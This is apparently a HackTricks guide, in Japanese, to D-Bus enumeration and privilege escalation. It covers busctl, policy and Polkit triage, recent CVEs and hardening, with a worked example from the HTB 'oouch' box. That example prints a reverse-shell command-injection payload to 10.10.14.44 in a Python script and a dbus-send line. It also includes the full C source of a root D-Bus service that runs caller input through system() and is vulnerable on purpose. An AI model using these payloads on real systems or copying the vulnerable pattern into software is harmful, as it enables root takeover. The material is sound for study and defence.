# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus は Ubuntu desktop environments におけるプロセス間通信（IPC）の mediator として利用されます。Ubuntu では、複数の message bus が同時に動作しています。system bus は主に、**privileged services が system 全体に関連する services を公開するために利用され**、session bus はログインしている各 user に対して存在し、その user のみに関連する services を公開します。ここでは、より高い privileges（例：root）で動作する services と関連しているため、主に system bus に焦点を当てます。目的は privileges を elevate することです。D-Bus の architecture では、各 session bus に 1 つの「router」が配置されており、client が通信したい service に対して指定した address に基づき、client messages を適切な services へ redirect します。<sup>[[1]](#references)</sup>

D-Bus 上の services は、公開する **objects** と **interfaces** によって定義されます。objects は標準的な OOP languages における class instances にたとえることができ、各 instance は **object path** によって一意に識別されます。この path は filesystem path に似ており、service が公開する各 object を一意に識別します。research purposes で重要な interface の 1 つが **org.freedesktop.DBus.Introspectable** interface です。この interface には Introspect という単一の method があり、object がサポートする methods、signals、properties を XML 表現で返します。ここでは properties と signals を省略し、methods に焦点を当てます。

D-Bus interface と通信するため、2 つの tools を使用しました。1 つは **gdbus** という CLI tool で、scripts 内から D-Bus が公開する methods を簡単に呼び出すためのものです。もう 1 つは [**D-Feet**](https://wiki.gnome.org/Apps/DFeet) で、各 bus で利用可能な services を enumerate し、各 service に含まれる objects を表示するよう設計された、Python-based GUI tool です。
```bash
sudo apt-get install d-feet
```
**session bus**を確認している場合は、まず現在のアドレスを確認します。
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

最初の画像には、D-Bus system bus に登録された services が表示されており、System Bus ボタンを選択した後に **org.debin.apt** が特に強調表示されています。D-Feet はこの service に対して objects をクエリし、2枚目の画像に示されているように、選択した objects の interfaces、methods、properties、signals を表示します。各 method の signature も詳細に表示されます。

注目すべき機能として、service の **process ID (pid)** と **command line** が表示されます。これは、その service が elevated privileges で実行されているかを確認するのに役立ち、research relevance の観点で重要です。

**D-Feet では method invocation も可能です**。ユーザーは parameters として Python expressions を入力でき、D-Feet はそれらを D-Bus types に変換してから service に渡します。

ただし、**一部の methods は invocation を許可する前に authentication を要求します**。そもそも私たちの目的は credentials なしで privileges を elevate することなので、これらの methods は無視します。

また、一部の services は、ユーザーが特定の actions を実行することを許可されるべきかどうかを、org.freedeskto.PolicyKit1 という別の D-Bus service に問い合わせます。

## **Cmd line Enumeration**

### Service Objects の一覧表示

次の方法で、開かれている D-Bus interfaces を一覧表示できます。
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
**`(activatable)`** とマークされた Services は、**まだ実行されていない**ものの、bus request によってオンデマンドで起動できるため、特に興味深い対象です。`busctl list` だけで終わらせず、それらの名前を実際に実行される binaries に対応付けてください。
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
これにより、activatable name に対してどの `Exec=` path が起動され、どの identity の下で実行されるかがすぐにわかります。binary またはその execution chain の保護が不十分な場合、inactive service が依然として privilege-escalation の経路になる可能性があります。

#### 接続

[Wikipediaより:](https://en.wikipedia.org/wiki/D-Bus) process が bus への connection を設定すると、bus はその connection に _unique connection name_ と呼ばれる特別な bus name を割り当てます。この種類の bus name は immutable です。つまり、connection が存在する限り変更されないことが保証されます。さらに重要なことに、bus の存続中に再利用することはできません。これは、同じ process が bus への connection を閉じて新しい connection を作成した場合であっても、その bus への他の connection に同じ unique connection name が割り当てられることは決してない、という意味です。unique connection name は、通常は禁止されているコロン文字で始まるため、簡単に識別できます。<sup>[[4]](#references)</sup>

### Service Object Info

次に、以下を使用して interface に関する情報を取得できます。
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
また、bus name と対応する `systemd` unit および executable path の対応関係も確認します：
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
これは、privesc 中に重要となる運用上の疑問に答えるものです。**メソッド呼び出しが成功した場合、実際にどのバイナリと unit がアクションを実行するのか？**

### Service Object のインターフェースを一覧表示する

十分な権限が必要です。
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Service ObjectのInterfaceをIntrospectする

この例では、`tree`パラメータを使用して、検出された最新のinterfaceが選択されていることに注目してください（_前のセクションを参照_）：
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
インターフェース `htb.oouch.Block` のメソッド `.Block`（今回関心があるもの）に注目してください。他の列にある「s」は、文字列を想定していることを意味している可能性があります。

危険な操作を試す前に、まず **read-oriented** またはその他の低リスクなメソッドで検証してください。これにより、構文が間違っている、到達可能だが拒否される、到達可能で許可されている、という3つのケースを明確に切り分けられます。
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus Methods を Policies および Actions と関連付ける

Introspection によって、**何**を呼び出せるかは分かりますが、その呼び出しが**なぜ**許可または拒否されるのかは分かりません。実際の privesc triage では、通常、次の**3つのレイヤー**をまとめて調査する必要があります。

1. **Activation metadata**（`.service` files または `SystemdService=`）を確認し、実際に実行される binary と unit を把握する。
2. **D-Bus XML policy**（`/etc/dbus-1/system.d/`、`/usr/share/dbus-1/system.d/`）を確認し、誰が `own`、`send_destination`、または `receive_sender` を実行できるか把握する。
3. **Polkit action files**（`/usr/share/polkit-1/actions/*.policy`）を確認し、default authorization model（`allow_active`、`allow_inactive`、`auth_admin`、`auth_self`、`org.freedesktop.policykit.imply`）を把握する。

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
D-Bus method と Polkit action の間に1:1の対応関係があると仮定してはいけません。同じ method でも、変更対象の object や runtime context に応じて異なる action が選択される場合があります。そのため、実際の workflow は次のとおりです。

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` を実行し、関連する `.policy` ファイルを grep する
3. `busctl call`、`gdbus call`、または `dbusmap --enable-probes --null-agent` を使って、低リスクの live probe を行う

Proxy または compatibility service には特に注意が必要です。別の D-Bus service へのリクエストを、あらかじめ確立した自身の connection 経由で転送する **root-running proxy** は、元の caller identity が再検証されない限り、backend にすべてのリクエストが UID 0 から来たものとして誤認させる可能性があります。<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

十分な privileges があれば（`send_destination` と `receive_sender` privileges だけでは不十分です）、**D-Bus communication を monitor** できます。

**communication を monitor** するには **root である必要があります。** root になっても問題が見つかる場合は、[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) と [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) を確認してください。

> [!WARNING]
> D-Bus config file を設定して **non root user が communication を sniff できるようにする**方法を知っている場合は、**私に連絡してください**！

monitor するさまざまな方法：
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
次の例では、インターフェース `htb.oouch.Block` が監視され、**メッセージ "**_**lalalalal**_**" が miscommunication を通じて送信されます**：
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Wiresharkで開ける **pcapng** ファイルに結果を保存するには、`monitor` の代わりに `capture` を使用できます。
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### すべてのノイズをフィルタリングする <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

バス上の情報が多すぎる場合は、次のように match rule を渡します:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
複数のルールを指定できます。メッセージがいずれかのルールに一致すると、そのメッセージが表示されます。以下のようになります：
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
詳細は、match rule syntaxに関する[D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)を参照してください。<sup>[[7]](#references)</sup>

### More

`busctl`にはさらに多くのオプションがあります。[**すべてのオプションはこちら**](https://www.freedesktop.org/software/systemd/man/busctl.html)で確認できます。

## **Vulnerable Scenario**

HTBのhost「oouch」内のuser **qtc**として、_/etc/dbus-1/system.d/htb.oouch.Block.conf_にある**予期しないD-Bus config file**を見つけることができます：
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
前の設定から、**この D-BUS communication を介して情報を送受信するには、ユーザー `root` または `www-data` である必要がある**ことがわかります。

Docker container **aeb4525789d8** 内のユーザー **qtc** として、ファイル _/code/oouch/routes.py_ に dbus 関連のコードがあります。以下が注目すべきコードです：
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
ご覧のとおり、**D-Bus interfaceに接続**し、**「Block」function**に「client_ip」を送信しています。

D-Bus connectionのもう一方では、Cでコンパイルされたbinaryが実行されています。このコードは、D-Bus connectionで**IP addressを待ち受け、`system` functionを介してiptablesを呼び出し**、指定されたIP addressをblockしています。\
**`system`へのcallはcommand injectionに対して意図的にvulnerable**なため、次のようなpayloadでreverse shellを作成できます: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

このページの最後には、**D-Bus applicationの完全なC code**があります。その中の91～97行目には、**`D-Bus object path`**と**`interface name`**が**登録されている方法**が記載されています。この情報は、D-Bus connectionに情報を送信するために必要です:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
また、57行目から、この D-Bus communication に登録されている**唯一の method**の名前が `Block` であることがわかります（_**そのため、次のセクションでは、payload は service object `htb.oouch.Block`、interface `/htb/oouch/Block`、method name `Block` に送信されます**_）：
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

以下の Python code は、`block_iface.Block(runme)` を介して payload を D-Bus connection の `Block` method に送信します（_前の code チャンクから抽出したものであることに注意してください_）：
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl と dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` は “Message Bus” にメッセージを送信するためのツールです。
- Message Bus – アプリケーション間の通信を容易にするためにシステムで使用されるソフトウェアです。Message Queue（メッセージが順番に並べられる）と関連していますが、Message Bus ではサブスクリプションモデルでメッセージが送信され、さらに非常に高速です。
- “-system” tag は、（デフォルトの）session message ではなく、system message であることを示すために使用されます。
- “–print-reply” tag は、メッセージを適切に出力し、返信がある場合は人間が読みやすい形式で受信するために使用されます。
- “–dest=Dbus-Interface-Block” は Dbus interface のアドレスです。
- “–string:” – interface に送信するメッセージの種類です。double、bytes、booleans、int、objpath など、メッセージを送信する形式はいくつかあります。このうち、“object path” は、ファイルのパスを Dbus interface に送信したい場合に便利です。この場合、特殊ファイル（FIFO）を使用して、ファイル名の形で interface に command を渡すことができます。“string:;” – これは、FIFO reverse shell file/command を配置した object path を再度呼び出すためのものです。

_`htb.oouch.Block.Block` では、最初の部分（`htb.oouch.Block`）が service object を参照し、最後の部分（`.Block`）が method name を参照することに注意してください。_

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

大規模な D-Bus attack surface を `busctl`/`gdbus` で手動列挙すると、すぐに大変になります。ここ数年でリリースされた 2 つの小規模な FOSS utility により、red-team や CTF engagements での作業を高速化できます。

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* C で記述された、単一の static binary（<50 kB）です。すべての object path を走査し、`Introspect` XML を取得して、所有する PID/UID にマッピングします。<sup>[[5]](#references)</sup>
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* この tool は、保護されていない well-known names に `!` を付けます。これにより、*own*（take over）できる service や、unprivileged shell から到達可能な method calls を即座に特定できます。

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* systemd units 内の *writable* な path と、過度に permissive な D-Bus policy files（例: `send_destination="*"`）を探す Python-only script です。<sup>[[6]](#references)</sup>
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module は以下の directories を検索し、通常の user が spoof または hijack できる service を強調表示します。
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

最近公開された CVEs を継続的に確認すると、custom code における類似した insecure patterns を見つけやすくなります。最近の良い例は次の 2 つです。<sup>[[2]](#references)[[3]](#references)</sup>

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root で実行される service が、unprivileged users に再設定可能な D-Bus interface を公開していました。これには attacker-controlled な macro behavior の読み込みも含まれていました。 | daemon が system bus 上で **device/profile/config management** を公開している場合、writable configuration や macro features を単なる "settings" ではなく、code-execution primitives として扱う。 |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root で実行される compatibility proxy が、元の caller の security context を保持せずに backend services へ requests を転送していたため、backends は proxy を UID 0 として信頼していました。 | **proxy / bridge / compatibility** D-Bus services は別の bug class として扱う。それらが privileged calls を relay する場合、caller UID/Polkit context が backend にどのように伝達されるかを確認する。 |

注目すべき patterns:
1. Service が **system bus 上で root として実行される**。
2. **authorization check が存在しない**か、check が **誤った subject に対して実行される**。
3. 到達可能な method が最終的に system state を変更する: package install、user/group changes、bootloader config、device profile updates、file writes、または direct command execution。

`dbusmap --enable-probes` または手動の `busctl call` を使用して method に到達可能か確認し、service の policy XML と Polkit actions を調査して、実際に **どの subject** が authorization されているかを把握します。

---

## Hardening & Detection Quick-Wins

* world-writable または *send/receive*-open policies を検索する:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* 危険な methods には Polkit を要求する – *root* proxies であっても、自身の PID ではなく *caller* PID を `polkit_authority_check_authorization_sync()` に渡す必要があります。
* 長時間実行される helpers では privileges を drop する（bus に接続した後、`sd_pid_get_owner_uid()` を使用して namespaces を切り替える）。
* Service を削除できない場合でも、少なくとも専用の Unix group に *scope* し、その XML policy で access を制限する。
* Blue-team: `busctl capture > /var/log/dbus_$(date +%F).pcapng` で system bus を capture し、Wireshark に import して anomaly detection を行う。

---

## References

- [1] [Ubuntu Desktop における USBCreator D-Bus Privilege Escalation](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service が unprivileged user による configuration を許可](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Deepin D-Bus Proxy Service における Authentication Bypass (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
